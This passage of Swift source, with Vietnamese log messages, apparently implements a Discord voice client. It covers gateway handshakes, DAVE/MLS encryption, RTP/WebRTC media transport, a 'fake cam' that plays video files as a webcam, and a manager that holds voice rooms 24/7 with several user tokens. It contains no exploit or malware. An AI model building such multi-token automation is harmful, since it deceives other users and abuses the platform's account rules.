                let daveVer = (d["dave_protocol_version"] as? Int)
                    ?? ((d["dave_protocol_version"] as? NSNumber)?.intValue)
                    ?? 0
                if (self.userId.isEmpty || self.userId == "0"), let ext = extractUserId(from: self.token) {
                    self.userId = ext
                }
                let uid64 = UInt64(self.userId) ?? 0
                let cid64 = UInt64(self.currentChannelId ?? "") ?? 0

                self.daveSession?.destroy()
                if uid64 > 0 && cid64 > 0 {
                    let dave = DaveE2EESession(protocolVersion: UInt16(daveVer), userId: uid64, channelId: cid64)
                    self.daveSession = dave
                    if let kp = dave.reinit() {
                        await sendVoiceBinary(op: 26, payload: kp)
                        log("🔐 Khởi tạo DAVE E2EE v\(daveVer): Đã gửi MLS KeyPackage (\(kp.count)B)")
                    }
                } else {
                    self.daveSession = nil
                }

                let vCodec = d["video_codec"] as? String ?? "-"

                if self.enableVideoCapabilities, let answerSdp = d["sdp"] as? String, !answerSdp.isEmpty, let rtc = self.webrtcClient {
                    if rtc.setDiscordAnswer(answerSdp) {
                        log("🌐 Nhận Voice WebRTC Answer (V:\(vCodec)) -> Đang bắt tay ICE + DTLS-SRTP...")
                        startVoiceWebRtcMonitor(vCodec: vCodec, daveVer: daveVer)
                    } else {
                        log("❌ Không parse được Voice WebRTC SDP Answer")
                    }
                } else {
                    let mode = d["mode"] as? String ?? self.encryptionMode
                    self.encryptionMode = mode
                    if let keyArr = d["secret_key"] as? [Int] {
                        self.secretKey = Data(keyArr.map { UInt8($0 & 0xFF) })
                    } else if let keyArr = d["secret_key"] as? [UInt8] {
                        self.secretKey = Data(keyArr)
                    }

                    DispatchQueue.main.async {
                        self.isVoiceUDPReady = true
                        self.isJoined = true
                    }
                    log("✅ Kênh thoại sẵn sàng (\(mode) | V:\(vCodec) | DAVE v\(daveVer))!")
                    if self.isSpeaking {
                        sendSpeaking(true)
                    }
                    if let camProf = self.desiredFakeCamProfile {
                        await self.applyFakeCamOnVoice(enabled: true, profile: camProf)
                    }
                    if let streamProf = self.desiredGoLiveProfile {
                        self.startGoLive(profile: streamProf)
                    }
                    self.onVoiceUDPReady?()
                    self.onRequestCamKeyFrame?()
                }
            }
        case 6: // Heartbeat ACK
            break
        case 9: // Resumed
            log("Voice Gateway đã hồi phục phiên (Resumed).")
        case 11, 13: // Clients Connect / Client Disconnect
            break
        case 15: // MEDIA_SINK_WANTS (người khác xem Cam -> ép gửi KeyFrame ngay!)
            self.onRequestCamKeyFrame?()
        case 21: // DAVE Prepare Transition
            if let d = json["d"] as? [String: Any],
               let tid = (d["transition_id"] as? Int) ?? (d["transition_id"] as? NSNumber)?.intValue,
               let ver = (d["protocol_version"] as? Int) ?? (d["protocol_version"] as? NSNumber)?.intValue,
               let dave = self.daveSession {
                let needReady = dave.prepareTransition(transitionId: UInt16(tid), protocolVersion: UInt16(ver))
                if needReady {
                    await sendVoiceJSON(["op": 23, "d": ["transition_id": tid]])
                }
            }
        case 22: // DAVE Execute Transition
            if let d = json["d"] as? [String: Any],
               let tid = (d["transition_id"] as? Int) ?? (d["transition_id"] as? NSNumber)?.intValue,
               let dave = self.daveSession {
                if dave.executeTransition(transitionId: UInt16(tid)) {
                    if dave.canEncrypt && !self.hasLoggedDaveReady {
                        self.hasLoggedDaveReady = true
                        log("🔐 DAVE E2EE đã kích hoạt hoàn tất (Transition #\(tid))!")
                        if self.isSpeaking {
                            self.sendSpeaking(true)
                        }
                        self.onVoiceUDPReady?()
                    }
                    self.onRequestCamKeyFrame?()
                }
            }
        case 24: // DAVE Prepare Epoch
            if let d = json["d"] as? [String: Any],
               let epoch = (d["epoch"] as? Int) ?? (d["epoch"] as? NSNumber)?.intValue,
               let ver = (d["protocol_version"] as? Int) ?? (d["protocol_version"] as? NSNumber)?.intValue,
               epoch == 1 {
                if (self.userId.isEmpty || self.userId == "0"), let ext = extractUserId(from: self.token) {
                    self.userId = ext
                }
                if self.daveSession == nil, ver > 0, let uid64 = UInt64(self.userId), let cid64 = UInt64(self.currentChannelId ?? "") {
                    self.daveSession = DaveE2EESession(protocolVersion: UInt16(ver), userId: uid64, channelId: cid64)
                }
                if let kp = self.daveSession?.reinit(protocolVersion: UInt16(ver)) {
                    await sendVoiceBinary(op: 26, payload: kp)
                    log("🔐 DAVE Epoch 1 (v\(ver)): Đã gửi MLS KeyPackage mới")
                }
            }
        default:
            break
        }
    }

    private func handleVoiceBinaryMessage(_ raw: Data) async {
        guard raw.count >= 3 else { return }
        let b = raw.startIndex
        let seq = (Int(raw[b]) << 8) | Int(raw[b + 1])
        self.voiceSeq = seq
        let op = raw[b + 2]
        let payload = Data(raw.dropFirst(3))

        guard let dave = self.daveSession else { return }

        switch op {
        case 25: // MLS External Sender
            if dave.setExternalSender(payload) {
                log("🔐 DAVE: Đã nhận MLS External Sender")
            }
        case 27: // MLS Proposals
            let res = dave.processProposals(payload: payload)
            if res.ok, let cw = res.commitWelcome {
                await sendVoiceBinary(op: 28, payload: cw)
            }
        case 29: // MLS Announce Commit Transition
            let res = dave.processCommit(payload: payload)
            if res.result == 1 {
                if res.transitionId != 0 {
                    await sendVoiceJSON(["op": 23, "d": ["transition_id": Int(res.transitionId)]])
                } else {
                    if dave.canEncrypt && !self.hasLoggedDaveReady {
                        self.hasLoggedDaveReady = true
                        log("🔐 DAVE E2EE đã kích hoạt hoàn tất (Commit #0)!")
                        if self.isSpeaking {
                            self.sendSpeaking(true)
                        }
                    }
                    self.onRequestCamKeyFrame?()
                }
            } else if res.result == -1 {
                await sendVoiceJSON(["op": 31, "d": ["transition_id": Int(res.transitionId)]])
                if let kp = dave.reinit() {
                    await sendVoiceBinary(op: 26, payload: kp)
                }
            }
        case 30: // MLS Welcome
            let res = dave.processWelcome(payload: payload)
            if res.ok {
                if res.transitionId != 0 {
                    await sendVoiceJSON(["op": 23, "d": ["transition_id": Int(res.transitionId)]])
                } else {
                    if dave.canEncrypt && !self.hasLoggedDaveReady {
                        self.hasLoggedDaveReady = true
                        log("🔐 DAVE E2EE đã kích hoạt hoàn tất (Welcome #0)!")
                        if self.isSpeaking {
                            self.sendSpeaking(true)
                        }
                    }
                    self.onRequestCamKeyFrame?()
                }
            } else {
                await sendVoiceJSON(["op": 31, "d": ["transition_id": Int(res.transitionId)]])
                if let kp = dave.reinit() {
                    await sendVoiceBinary(op: 26, payload: kp)
                }
            }
        default:
            break
        }
    }

    private func fetchPublicIP() async -> String? {
        guard let raw = RemoteFeatureVault.shared.voiceConfig(scope: scope)?.ip_lookup_url,
              !raw.isEmpty,
              let url = URL(string: raw) else { return nil }
        var req = URLRequest(url: url)
        req.timeoutInterval = 3
        if let (data, _) = try? await URLSession.shared.data(for: req),
           let ip = String(data: data, encoding: .utf8)?.trimmingCharacters(in: .whitespacesAndNewlines),
           !ip.isEmpty {
            return ip
        }
        return nil
    }

    private func startUDPKeepAlive() {
        udpKeepAliveTask?.cancel()
        udpKeepAliveCounter = 0
        udpKeepAliveTask = Task.detached { [weak self] in
            while !Task.isCancelled {
                guard let self = self else { break }
                var buf = [UInt8](repeating: 0, count: 8)
                let c = self.udpKeepAliveCounter
                buf[0] = UInt8(c & 0xFF)
                buf[1] = UInt8((c >> 8) & 0xFF)
                buf[2] = UInt8((c >> 16) & 0xFF)
                buf[3] = UInt8((c >> 24) & 0xFF)
                self.udpKeepAliveCounter = c &+ 1
                self.udpClient.sendPacket(Data(buf))
                try? await Task.sleep(nanoseconds: 5_000_000_000)
            }
        }
    }

    private func startVoiceWebRtcOffer() async {
        guard !hasSentSelectProtocol else { return }
        hasSentSelectProtocol = true

        webrtcClient?.close()
        guard let rtc = DiscordWebRtcClient(
            audioSsrc: UInt32(truncatingIfNeeded: self.ssrc),
            videoSsrc: UInt32(truncatingIfNeeded: self.videoSsrc),
            rtxSsrc: UInt32(truncatingIfNeeded: self.rtxSsrc)
        ), let offerSdp = rtc.offerSdp else {
            log("❌ Không thể khởi tạo WebRTC transport cho Voice/Cam")
            return
        }
        self.webrtcClient = rtc

        let rtcConnId = UUID().uuidString.lowercased()
        await sendVoiceJSON([
            "op": 1,
            "d": [
                "protocol": "webrtc",
                "codecs": DiscordWebRtcClient.discordWebRtcCodecs(),
                "data": offerSdp,
                "sdp": offerSdp,
                "rtc_connection_id": rtcConnId
            ]
        ])
    }

    private func startVoiceWebRtcMonitor(vCodec: String, daveVer: Int) {
        webrtcMonitorTask?.cancel()
        webrtcMonitorTask = Task { [weak self] in
            guard let self = self else { return }
            var notifiedReady = false
            var waitedTicks = 0
            while !Task.isCancelled {
                guard let rtc = self.webrtcClient else { break }
                if !notifiedReady {
                    if rtc.isConnected {
                        notifiedReady = true
                        DispatchQueue.main.async {
                            self.isVoiceUDPReady = true
                            self.isJoined = true
                        }
                        self.log("✅ Kênh thoại WebRTC DTLS-SRTP sẵn sàng (V:\(vCodec) | DAVE v\(daveVer))!")
                        if self.isSpeaking {
                            self.sendSpeaking(true)
                        }
                        if let camProf = self.desiredFakeCamProfile {
                            await self.applyFakeCamOnVoice(enabled: true, profile: camProf)
                        }
                        if let streamProf = self.desiredGoLiveProfile {
                            self.startGoLive(profile: streamProf)
                        }
                        self.onVoiceUDPReady?()
                        self.onRequestCamKeyFrame?()
                    } else {
                        waitedTicks += 1
                        if waitedTicks == 125 { // ~10s
                            self.log("⚠️ Voice WebRTC ICE/DTLS chưa kết nối sau 10s (kiểm tra mạng/UDP)")
                        }
                    }
                }
                if notifiedReady && rtc.takeKeyframeRequest() {
                    self.onRequestCamKeyFrame?()
                }
                try? await Task.sleep(nanoseconds: 80_000_000)
            }
        }
    }

    private func startVoiceUDP(ip: String, port: Int) {
        log("Đang mở socket UDP tới \(ip):\(port)...")
        guard udpClient.connect(ip: ip, port: UInt16(port)) else {
            log("Lỗi khởi tạo UDP socket")
            return
        }

        Task.detached { [weak self] in
            guard let self = self else { return }
            var extIP = ""
            var extPort = port

            if let disc = self.udpClient.discoverIP(ssrc: UInt32(truncatingIfNeeded: self.ssrc)) {
                extIP = disc.ip
                extPort = Int(disc.port)
                self.log("Phát hiện UDP IP ngoại vi: \(extIP):\(extPort)")
            } else {
                if let pub = await self.fetchPublicIP() {
                    extIP = pub
                    self.log("Dùng Public IPv4 fallback: \(extIP):\(extPort)")
                } else if let resolved = resolveHostToIPv4(ip) {
                    extIP = resolved
                    self.log("Dùng Host IP trực tiếp: \(extIP):\(extPort)")
                } else {
                    extIP = ip
                }
            }

            self.startUDPKeepAlive()
            self.log("Gửi Select Protocol (\(self.encryptionMode)) tới Voice Gateway...")
            await self.sendSelectProtocol(ip: extIP, port: extPort)
        }
    }

    private func sendSelectProtocol(ip: String, port: Int) async {
        guard !hasSentSelectProtocol else { return }
        hasSentSelectProtocol = true
        var d: [String: Any] = [
            "protocol": "udp",
            "data": [
                "address": ip,
                "port": port,
                "mode": self.encryptionMode
            ]
        ]
        if enableVideoCapabilities {
            d["codecs"] = DiscordWebRtcClient.discordWebRtcCodecs(scope: scope)
        }
        await sendVoiceJSON(["op": 1, "d": d])
    }

    private func startVoiceHeartbeat(intervalMs: Double) {
        voiceHeartbeatTask?.cancel()
        let intervalSec = max(1.0, intervalMs / 1000.0)
        voiceHeartbeatTask = Task { [weak self] in
            while !Task.isCancelled {
                try? await Task.sleep(nanoseconds: UInt64(intervalSec * 1_000_000_000))
                guard let self = self, self.voiceWsTask != nil else { break }
                let nowMs = Int(Date().timeIntervalSince1970 * 1000)
                await self.sendVoiceJSON([
                    "op": 3,
                    "d": [
                        "t": nowMs,
                        "seq_ack": self.voiceSeq
                    ]
                ])
            }
        }
    }

    private func sendVoiceIdentify(guildId: String, sessionId: String, token: String) async {
        var uid = self.userId
        if (uid.isEmpty || uid == "0"), let ext = extractUserId(from: self.token) {
            uid = ext
            self.userId = ext
        }

        var d: [String: Any] = [
            "server_id": guildId,
            "user_id": uid,
            "session_id": sessionId,
            "token": token,
            "max_dave_protocol_version": DaveE2EESession.maxProtocolVersion
        ]
        if enableVideoCapabilities, let rid = RemoteFeatureVault.shared.voiceConfig(scope: scope)?.stream_rid, !rid.isEmpty {
            d["video"] = true
            d["streams"] = [
                ["type": "screen", "rid": rid, "quality": 100]
            ]
        }
        let payload: [String: Any] = [
            "op": 0,
            "d": d
        ]
        log("Gửi Voice Identify v8: Server=\(guildId), User=\(uid), Session=\(sessionId.prefix(8))..., DAVE=\(DaveE2EESession.maxProtocolVersion)...")
        await sendVoiceJSON(payload)
    }

    // MARK: - FAKE CAM (CAMERA ẢO TRÊN KÊNH VOICE CHÍNH)
    func setFakeCam(enabled: Bool, profile: DiscordStreamProfile?) {
        if enabled, let prof = profile {
            self.desiredFakeCamProfile = prof
            self.selfVideo = true
            self.hasLoggedCamVideoStart = false
            self.hasLoggedCamDaveErr = false
            sendVoiceStateUpdate()
            if isVoiceUDPReady {
                Task { [weak self] in
                    await self?.applyFakeCamOnVoice(enabled: true, profile: prof)
                }
            }
        } else {
            self.desiredFakeCamProfile = nil
            self.selfVideo = false
            self.hasLoggedCamVideoStart = false
            sendVoiceStateUpdate()
            Task { [weak self] in
                await self?.applyFakeCamOnVoice(enabled: false, profile: nil)
            }
        }
    }

    private func applyFakeCamOnVoice(enabled: Bool, profile: DiscordStreamProfile?) async {
        if enabled, let prof = profile, videoSsrc != 0, let rid = RemoteFeatureVault.shared.voiceConfig(scope: scope)?.stream_rid, !rid.isEmpty {
            let d: [String: Any] = [
                "audio_ssrc": ssrc,
                "video_ssrc": videoSsrc,
                "rtx_ssrc": rtxSsrc,
                "streams": [[
                    "type": "video",
                    "rid": rid,
                    "ssrc": videoSsrc,
                    "active": true,
                    "quality": 100,
                    "rtx_ssrc": rtxSsrc,
                    "max_bitrate": prof.maxBitrateKbps * 1000,
                    "max_framerate": prof.fps,
                    "max_resolution": [
                        "type": "fixed",
                        "width": prof.width,
                        "height": prof.height
                    ]
                ]]
            ]
            await sendVoiceJSON(["op": 12, "d": d])
            DispatchQueue.main.async { self.isFakeCamActive = true }
            self.onRequestCamKeyFrame?()
            log("🎥 Đã bật Fake Cam (\(prof.width)x\(prof.height)@\(prof.fps)fps)")
        } else {
            let d: [String: Any] = [
                "audio_ssrc": ssrc,
                "video_ssrc": 0,
                "rtx_ssrc": 0,
                "streams": []
            ]
            await sendVoiceJSON(["op": 12, "d": d])
            DispatchQueue.main.async { self.isFakeCamActive = false }
        }
    }

    /// Gửi khung hình H.264 Annex-B cho Fake Cam qua WebRTC DTLS-SRTP (hoặc UDP fallback)
    func sendCamVideoFrame(_ annexBFrame: Data, frametimeMs: Double) {
        guard isVoiceUDPReady, isFakeCamActive, videoSsrc != 0 else { return }

        if let rtc = self.webrtcClient {
            guard rtc.isConnected else { return }
            if rtc.takeKeyframeRequest() {
                onRequestCamKeyFrame?()
            }

            let frameToSend: Data
            if let dave = self.daveSession, dave.isEncryptionRequired {
                if let encrypted = dave.encryptVideoH264(annexBFrame) {
                    frameToSend = encrypted
                } else {
                    if dave.canEncrypt && !hasLoggedCamDaveErr {
                        hasLoggedCamDaveErr = true
                        log("⚠️ Lỗi DAVE mã hóa khung Fake Cam H.264 (\(annexBFrame.count)B)")
                    }
                    return
                }
            } else {
                frameToSend = annexBFrame
            }

            let sent = rtc.sendH264(frameToSend, frametimeMs: frametimeMs)
            if !hasLoggedCamVideoStart && sent {
                hasLoggedCamVideoStart = true
                log("🎥 Fake Cam WebRTC đang phát hình H.264 (\(frameToSend.count)B)!")
            }
            return
        }

        guard let key = secretKey, key.count == 32 else { return }

        let frameToSend: Data
        if let dave = self.daveSession, dave.isEncryptionRequired {
            if let encrypted = dave.encryptVideoH264(annexBFrame) {
                frameToSend = encrypted
            } else {
                if dave.canEncrypt && !hasLoggedCamDaveErr {
                    hasLoggedCamDaveErr = true
                    log("⚠️ Lỗi DAVE mã hóa khung Fake Cam H.264 (\(annexBFrame.count)B)")
                }
                return
            }
        } else {
            frameToSend = annexBFrame
        }

        let pkts = camVideoPacketizer.sendFrame(
            annexBFrame: frameToSend,
            frametimeMs: frametimeMs,
            secretKey: key,
            encryptionMode: encryptionMode,
            nonceBox: transportNonce,
            udpClient: udpClient
        )

        if !hasLoggedCamVideoStart && pkts > 0 {
            hasLoggedCamVideoStart = true
            log("🎥 Đang phát hình Fake Cam H.264 (\(frameToSend.count)B → \(pkts) gói RTP)!")
        }
    }

    // MARK: - GO LIVE STREAM (OP 18 STREAM_CREATE / OP 22 PAUSE / OP 19 DELETE)
    private func makeStreamKey() -> String {
        let gid = currentGuildId ?? ""
        let cid = currentChannelId ?? ""
        var uid = self.userId
        if (uid.isEmpty || uid == "0"), let ext = extractUserId(from: self.token) {
            uid = ext
            self.userId = ext
        }
        return "guild:\(gid):\(cid):\(uid)"
    }

    private func sendMainGatewayJSON(_ payload: [String: Any]) {
        guard let ws = wsTask else { return }
        if let data = try? JSONSerialization.data(withJSONObject: payload),
           let str = String(data: data, encoding: .utf8) {
            Task { try? await ws.send(.string(str)) }
        }
    }

    func startGoLive(profile: DiscordStreamProfile) {
        desiredGoLiveProfile = profile
        guard let gid = currentGuildId, let cid = currentChannelId,
              let sid = voiceSessionId, !sid.isEmpty else {
            return
        }

        streamSession?.stop()
        streamSession = nil
        pendingStreamServerId = nil
        pendingStreamEndpoint = nil
        pendingStreamToken = nil

        let streamKey = makeStreamKey()
        pendingStreamKey = streamKey
        log("📺 Đang khởi tạo Go Live Stream (\(profile.label))...")

        // Op 18: STREAM_CREATE
        sendMainGatewayJSON([
            "op": 18,
            "d": [
                "type": "guild",
                "guild_id": gid,
                "channel_id": cid,
                "preferred_region": NSNull()
            ]
        ])
        // Op 22: STREAM_SET_PAUSED (paused: false)
        sendMainGatewayJSON([
            "op": 22,
            "d": [
                "stream_key": streamKey,
                "paused": false
            ]
        ])
    }

    func stopGoLive() {
        let hadStream = (streamSession != nil || desiredGoLiveProfile != nil || isGoLiveActive)
        desiredGoLiveProfile = nil
        streamSession?.stop()
        streamSession = nil
        pendingStreamServerId = nil
        pendingStreamEndpoint = nil
        pendingStreamToken = nil

        if hadStream {
            let streamKey = pendingStreamKey ?? makeStreamKey()
            sendMainGatewayJSON([
                "op": 19,
                "d": ["stream_key": streamKey]
            ])
            log("⏹ Đã tắt Go Live Stream.")
        }
        pendingStreamKey = nil
        DispatchQueue.main.async { self.isGoLiveActive = false }
    }

    private func tryConnectStreamMediaSession() {
        guard let prof = desiredGoLiveProfile,
              let rtcServerId = pendingStreamServerId, !rtcServerId.isEmpty,
              let streamKey = pendingStreamKey, !streamKey.isEmpty,
              let endpoint = pendingStreamEndpoint, !endpoint.isEmpty,
              let sToken = pendingStreamToken, !sToken.isEmpty,
              let vSid = voiceSessionId, !vSid.isEmpty else { return }

        if let cur = streamSession, cur.token == sToken, cur.rtcServerId == rtcServerId {
            return
        }

        streamSession?.stop()
        let ss = DiscordStreamMediaSession(
            rtcServerId: rtcServerId,
            streamKey: streamKey,
            userId: self.userId,
            sessionId: vSid,
            token: sToken,
            endpoint: endpoint,
            username: self.username
        )
        ss.targetWidth = prof.width
        ss.targetHeight = prof.height
        ss.targetFps = prof.fps
        ss.targetMaxBitrateKbps = prof.maxBitrateKbps
        ss.onLog = { [weak self] msg in
            DispatchQueue.main.async {
                self?.onLog?(msg)
            }
        }
        ss.onReady = { [weak self] in
            DispatchQueue.main.async {
                self?.isGoLiveActive = true
            }
            self?.onGoLiveReady?()
        }
        ss.onRequestKeyFrame = { [weak self] in
            self?.onRequestGoLiveKeyFrame?()
        }
        self.streamSession = ss
        ss.connect()
    }

    func sendGoLiveVideoFrame(_ annexBFrame: Data, frametimeMs: Double) {
        streamSession?.sendVideoH264Frame(annexBFrame, frametimeMs: frametimeMs)
    }

    func sendGoLiveAudioPacket(_ opusPayload: Data) {
        streamSession?.sendOpusPacket(opusPayload)
    }

    func setSpeaking(_ speaking: Bool) {
        self.isSpeaking = speaking
        sendSpeaking(speaking)
    }

    private func sendSpeaking(_ speaking: Bool) {
        guard let ws = voiceWsTask else { return }
        let payload: [String: Any] = [
            "op": 5,
            "d": [
                "speaking": speaking ? 1 : 0,
                "delay": 0,
                "ssrc": ssrc
            ]
        ]
        if let data = try? JSONSerialization.data(withJSONObject: payload),
           let str = String(data: data, encoding: .utf8) {
            Task { try? await ws.send(.string(str)) }
        }
    }

    /// Truyền gói tin âm thanh Opus trực tiếp vào kênh thoại qua WebRTC DTLS-SRTP hoặc UDP RTP (DAVE E2EE)
    func sendOpusPacket(_ opusPayload: Data) {
        guard isVoiceUDPReady else { return }

        let silenceFrame = Data([0xF8, 0xFF, 0xFE])
        let mediaPayload: Data
        if let dave = self.daveSession, dave.isEncryptionRequired {
            if let encrypted = dave.encryptOpus(opusPayload) {
                mediaPayload = encrypted
                if !self.hasLoggedAudioStart && opusPayload != silenceFrame {
                    self.hasLoggedAudioStart = true
                    log("🔊 Đang truyền âm thanh Opus + DAVE E2EE vào kênh thoại!")
                }
            } else {
                // DAVE đang chờ hoàn tất MLS transition -> gửi khung im lặng để giữ luồng
                mediaPayload = silenceFrame
            }
        } else {
            mediaPayload = opusPayload
            if !self.hasLoggedAudioStart && opusPayload != silenceFrame {
                self.hasLoggedAudioStart = true
                log("🔊 Đang truyền âm thanh Opus vào kênh thoại!")
            }
        }

        if let rtc = self.webrtcClient, rtc.isConnected {
            rtc.sendOpus(mediaPayload)
            return
        }

        guard let key = secretKey, key.count == 32 else { return }

        packetLock.lock()
        let seq = rtpSequence
        let ts = rtpTimestamp
        rtpSequence = rtpSequence &+ 1
        rtpTimestamp = rtpTimestamp &+ 960
        packetLock.unlock()

        let nonceVal = transportNonce.next()

        // 12-byte RTP Header
        var header = [UInt8](repeating: 0, count: 12)
        header[0] = 0x80
        header[1] = 0x78 // Payload type 120 (Opus)
        header[2] = UInt8((seq >> 8) & 0xFF)
        header[3] = UInt8(seq & 0xFF)
        header[4] = UInt8((ts >> 24) & 0xFF)
        header[5] = UInt8((ts >> 16) & 0xFF)
        header[6] = UInt8((ts >> 8) & 0xFF)
        header[7] = UInt8(ts & 0xFF)
        header[8] = UInt8((ssrc >> 24) & 0xFF)
        header[9] = UInt8((ssrc >> 16) & 0xFF)
        header[10] = UInt8((ssrc >> 8) & 0xFF)
        header[11] = UInt8(ssrc & 0xFF)

        let noncePrefix: [UInt8] = [
            UInt8((nonceVal >> 24) & 0xFF),
            UInt8((nonceVal >> 16) & 0xFF),
            UInt8((nonceVal >> 8) & 0xFF),
            UInt8(nonceVal & 0xFF)
        ]

        if let xchacha = RemoteFeatureVault.shared.voiceConfig(scope: scope)?.aead_xchacha, !xchacha.isEmpty, encryptionMode == xchacha {
            var nonce24 = [UInt8](repeating: 0, count: 24)
            nonce24[0] = noncePrefix[0]
            nonce24[1] = noncePrefix[1]
            nonce24[2] = noncePrefix[2]
            nonce24[3] = noncePrefix[3]

            let cipherData: Data? = key.withUnsafeBytes { keyRaw in
                header.withUnsafeBufferPointer { aadBuf in
                    mediaPayload.withUnsafeBytes { ptRaw in
                        guard let kPtr = keyRaw.bindMemory(to: UInt8.self).baseAddress,
                              let pPtr = ptRaw.bindMemory(to: UInt8.self).baseAddress else { return nil }
                        let out = dave_xchacha20_poly1305_encrypt(kPtr, nonce24, aadBuf.baseAddress, header.count, pPtr, mediaPayload.count)
                        return consumeDaveBuffer(out)
                    }
                }
            }
            if let ct = cipherData {
                var packet = Data(header)
                packet.append(ct)
                packet.append(contentsOf: noncePrefix)
                udpClient.sendPacket(packet)
            }
        } else {
            // AES-256-GCM RTP transport: 4-byte counter (BE) + 8 bytes zero = 12 bytes nonce
            var nonceBytes = [UInt8](repeating: 0, count: 12)
            nonceBytes[0] = noncePrefix[0]
            nonceBytes[1] = noncePrefix[1]
            nonceBytes[2] = noncePrefix[2]
            nonceBytes[3] = noncePrefix[3]

            do {
                let nonce = try AES.GCM.Nonce(data: nonceBytes)
                let symKey = SymmetricKey(data: key)
                let sealed = try AES.GCM.seal(mediaPayload, using: symKey, nonce: nonce, authenticating: Data(header))

                // Packet = Header (12) + Ciphertext + Tag (16) + Nonce Suffix (4)
                var packet = Data(header)
                packet.append(sealed.ciphertext)
                packet.append(sealed.tag)
                packet.append(contentsOf: noncePrefix)

                udpClient.sendPacket(packet)
            } catch {
                // Transport encrypt error
            }
        }
    }

    func urlSession(_ session: URLSession, webSocketTask: URLSessionWebSocketTask, didCloseWith closeCode: URLSessionWebSocketTask.CloseCode, reason: Data?) {
        let reasonStr = reason.flatMap { String(data: $0, encoding: .utf8) } ?? ""
        let label = (webSocketTask === wsTask) ? "Gateway chính" : "Voice WebSocket"
        log("\(label) đóng [Mã \(closeCode.rawValue)]: \(reasonStr)")
    }

    func stop() {
        stopGoLive()
        isVoiceConnecting = false
        activeVoiceToken = nil
        activeVoiceSessionId = nil
        voiceSessionId = nil
        voiceToken = nil
        voiceEndpoint = nil
        gatewaySeq = nil
        desiredFakeCamProfile = nil
        hasLoggedAudioStart = false
        hasLoggedDaveReady = false
        hasLoggedCamVideoStart = false
        hasSentVoiceIdentify = false
        hasSentSelectProtocol = false
        if let gid = currentGuildId {
            let payload: [String: Any] = [
                "op": 4,
                "d": [
                    "guild_id": gid,
                    "channel_id": NSNull(),
                    "self_mute": false,
                    "self_deaf": false,
                    "self_video": false
                ]
            ]
            if let data = try? JSONSerialization.data(withJSONObject: payload),
               let str = String(data: data, encoding: .utf8),
               let ws = wsTask {
                Task { try? await ws.send(.string(str)) }
            }
        }

        heartbeatTask?.cancel(); heartbeatTask = nil
        listenTask?.cancel(); listenTask = nil
        wsTask?.cancel(with: .goingAway, reason: nil); wsTask = nil
        gatewaySession?.invalidateAndCancel(); gatewaySession = nil

        voiceHeartbeatTask?.cancel(); voiceHeartbeatTask = nil
        udpKeepAliveTask?.cancel(); udpKeepAliveTask = nil
        webrtcMonitorTask?.cancel(); webrtcMonitorTask = nil
        webrtcClient?.close(); webrtcClient = nil
        voiceListenTask?.cancel(); voiceListenTask = nil
        voiceWsTask?.cancel(with: .goingAway, reason: nil); voiceWsTask = nil
        voiceGatewaySession?.invalidateAndCancel(); voiceGatewaySession = nil
        daveSession?.destroy(); daveSession = nil
        udpClient.close()

        DispatchQueue.main.async {
            self.isConnected = false
            self.isJoined = false
            self.isSpeaking = false
            self.isVoiceUDPReady = false
            self.isFakeCamActive = false
            self.isGoLiveActive = false
        }
        log("Đã ngắt kết nối.")
    }
}

// MARK: - LOG ENTRY
typealias VoiceRoomLog = VoiceLogEntry
struct VoiceLogEntry: Identifiable {
    var id: UUID = UUID()
    let timestamp: Date
    let message: String

    init(id: UUID = UUID(), timestamp: Date, message: String) {
        self.id = id
        self.timestamp = timestamp
        self.message = message
    }
}

// ==============================================================================
// MARK: - VOICE ROOM MANAGER (TREO ROOM 24/7 + FAKE CAM + GO LIVE STREAM)
// ==============================================================================
@MainActor
final class VoiceRoomManager: ObservableObject {
    static let shared = VoiceRoomManager()

    @Published var isRunning = false
    @Published var targetChannelId = ""
    @Published var selectedGuild: Guild? = nil
    @Published var selectedChannel: Channel? = nil
    @Published var voiceChannels: [Channel] = []
    @Published var isLoadingChannels = false

    @Published var multiTokenMode = true
    @Published var selfMute = false
    @Published var selfDeaf = false
    @Published var selfVideo = false

    // Cấu hình Fake Cam + Go Live Stream (từ room.js)
    @Published var videoQualityMode: TreoVideoQualityMode = .autoNitro
    @Published var streamMedia: TreoMediaSource? = nil
    @Published var camMedia: TreoMediaSource? = nil
    @Published var isStreamEnabled: Bool = false
    @Published var isCamEnabled: Bool = false
    @Published var streamCacheStatus: H264CacheStatus = .none
    @Published var camCacheStatus: H264CacheStatus = .none

    @Published var sessions: [VoiceGatewaySession] = []
    @Published var elapsedSeconds: Int = 0
    @Published var logs: [VoiceLogEntry] = []

    private var timer: Timer?
    private var joinTask: Task<Void, Never>?
    private var activeChannelName: String = ""
    private let goLiveEngine = TreoMediaBroadcastEngine()
    private let fakeCamEngine = TreoMediaBroadcastEngine()
    private var streamCacheListener: (H264FullVideoCacheSession, UUID)?
    private var camCacheListener: (H264FullVideoCacheSession, UUID)?

    private init() {}

    var activeProfile: DiscordStreamProfile {
        let hasNitro = sessions.contains { $0.premiumType == 1 || $0.premiumType == 2 }
        return videoQualityMode.resolveProfile(hasNitroAccount: hasNitro)
    }

    private func camProfile(from base: DiscordStreamProfile) -> DiscordStreamProfile {
        DiscordStreamProfile(
            width: base.width,
            height: base.height,
            fps: base.fps,
            bitrateKbps: max(400, Int(Double(base.bitrateKbps) * 0.7)),
            maxBitrateKbps: base.maxBitrateKbps,
            label: base.label
        )
    }

    /// Tự động chuẩn bị Full-Video H.264 0%-GPU cache ngay khi chọn file video để thoát app phát trọn video!
    func prepareBackgroundCache(forStream: Bool) {
        if forStream {
            if let old = streamCacheListener { old.0.removeListener(old.1); streamCacheListener = nil }
            streamCacheStatus = .none
        } else {
            if let old = camCacheListener { old.0.removeListener(old.1); camCacheListener = nil }
            camCacheStatus = .none
        }

        let media = forStream ? streamMedia : camMedia
        guard let src = media, !src.isVirtualPattern, !src.isAudioOnly, let url = src.url else {
            return
        }

        let prof = forStream ? activeProfile : camProfile(from: activeProfile)
        let targetId = src.id

        Task.detached(priority: .userInitiated) { [weak self] in
            let asset = AVURLAsset(url: url)
            guard let track = asset.tracks(withMediaType: .video).first else { return }
            let isDirect = TreoMediaBroadcastEngine.canUseDirectH264Passthrough(asset: asset, track: track, profile: prof)

            await MainActor.run { [weak self] in
                guard let self = self else { return }
                let curMedia = forStream ? self.streamMedia : self.camMedia
                guard curMedia?.id == targetId else { return }

                if isDirect {
                    if forStream { self.streamCacheStatus = .directPassthrough }
                    else { self.camCacheStatus = .directPassthrough }
                    return
                }

                let sess = H264FullVideoCacheManager.shared.getOrCreateSession(
                    url: url,
                    title: src.title,
                    profile: prof
                )
                let lid = sess.addListener(
                    onStatus: { [weak self] st in
